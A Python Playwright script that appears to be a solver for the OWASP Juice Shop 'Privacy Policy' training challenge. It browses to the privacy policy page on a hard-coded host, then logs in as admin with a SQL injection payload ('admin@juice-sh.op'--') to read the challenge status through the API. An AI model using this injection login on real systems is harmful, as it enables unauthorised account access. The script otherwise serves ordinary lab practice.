#!/usr/bin/env python3
"""
Privacy Policy Challenge Browser Solver for OWASP Juice Shop v18
Uses browser automation to properly load the privacy policy page
"""

from playwright.sync_api import sync_playwright
import time
import requests

TARGET = "http://66.42.93.220:3000"

def solve_privacy_policy_with_browser():
    """Solve Privacy Policy challenge using browser automation"""
    
    print("🎯 PRIVACY POLICY CHALLENGE - Browser Solution")
    print("=" * 60)
    
    with sync_playwright() as p:
        # Launch browser
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        
        # Enable console logging for debugging
        page.on("console", lambda msg: print(f"   Console: {msg.text[:100]}") if msg.text else None)
        
        print("🌐 Browser launched")
        
        # Method 1: Navigate to main page and look for Privacy Policy link
        print("\n1️⃣ Navigating to Juice Shop main page...")
        page.goto(TARGET, wait_until="networkidle", timeout=30000)
        time.sleep(2)
        
        # Look for Privacy Policy link in the page
        print("🔍 Looking for Privacy Policy link...")
        
        try:
            # Try to find and click Privacy Policy link
            privacy_links = [
                'text=Privacy Policy',
                'text=Privacy',
                'a:has-text("Privacy")',
                'a[href*="privacy"]',
                '[aria-label*="privacy" i]',
                'text=/privacy.*/i',
            ]
            
            for selector in privacy_links:
                try:
                    link = page.locator(selector).first
                    if link and link.is_visible():
                        print(f"   Found link with selector: {selector}")
                        link.click()
                        time.sleep(3)
                        print("   ✅ Clicked Privacy Policy link")
                        break
                except:
                    continue
        except:
            print("   ⚠️ Could not find clickable Privacy Policy link")
        
        # Method 2: Direct navigation to privacy policy URL
        print("\n2️⃣ Direct navigation to privacy policy page...")
        privacy_url = f"{TARGET}/#/privacy-security/privacy-policy"
        page.goto(privacy_url, wait_until="networkidle", timeout=30000)
        time.sleep(3)
        print(f"   ✅ Navigated to: {privacy_url}")
        
        # Wait for content to load
        print("   ⏳ Waiting for content to load...")
        time.sleep(2)
        
        # Try to interact with the page to ensure it's fully loaded
        try:
            # Scroll to bottom to ensure full page load
            page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
            print("   📜 Scrolled to bottom of page")
        except:
            pass
        
        # Take screenshot for verification
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/privacy_policy_page.png")
        print("   📸 Screenshot saved")
        
        # Method 3: Try alternative privacy policy URLs
        print("\n3️⃣ Trying alternative privacy policy URLs...")
        alternative_urls = [
            f"{TARGET}/privacy-security/privacy-policy",
            f"{TARGET}/#/privacy-policy",
            f"{TARGET}/privacy",
        ]
        
        for url in alternative_urls:
            try:
                page.goto(url, wait_until="domcontentloaded", timeout=10000)
                time.sleep(2)
                print(f"   ✅ Visited: {url}")
            except:
                print(f"   ❌ Could not load: {url}")
        
        # Method 4: Navigate through About section
        print("\n4️⃣ Navigating through About section...")
        page.goto(f"{TARGET}/#/about", wait_until="networkidle", timeout=30000)
        time.sleep(2)
        
        # Look for privacy policy link in About page
        try:
            privacy_in_about = page.locator('text=/privacy/i').first
            if privacy_in_about and privacy_in_about.is_visible():
                privacy_in_about.click()
                time.sleep(2)
                print("   ✅ Found and clicked Privacy Policy in About section")
        except:
            pass
        
        # Keep browser open for a moment to ensure any async operations complete
        print("\n⏳ Waiting for challenge to register...")
        time.sleep(3)
        
        browser.close()
    
    print("\n📊 Checking challenge status...")
    
    # Check if challenge is solved
    session = requests.Session()
    
    # Login as admin
    login_payload = {"email": "admin@juice-sh.op'--", "password": "anything"}
    resp = session.post(f"{TARGET}/rest/user/login", json=login_payload)
    if resp.status_code == 200:
        token = resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Check challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        privacy_challenge = next((c for c in challenges if 'Privacy Policy' in c.get('name', '')), None)
        
        if privacy_challenge:
            if privacy_challenge.get('solved', False):
                print(f"\n✅ SUCCESS! {privacy_challenge['name']} is SOLVED!")
                print(f"   Category: {privacy_challenge.get('category', 'Unknown')}")
                print(f"   Difficulty: {'⭐' * privacy_challenge.get('difficulty', 1)}")
                return True
            else:
                print(f"\n⚠️ {privacy_challenge['name']} not yet marked as solved")
                print("\n💡 The privacy policy page was accessed multiple times")
                print("   The challenge may require specific interaction or timing")
    
    print("\n" + "=" * 60)
    print("📊 Check the scoreboard: http://66.42.93.220:3000/#/score-board")
    
    return False

if __name__ == "__main__":
    result = solve_privacy_policy_with_browser()
    if result:
        print("\n🎉 Challenge successfully solved!")
    else:
        print("\n📝 Manual verification may be required")
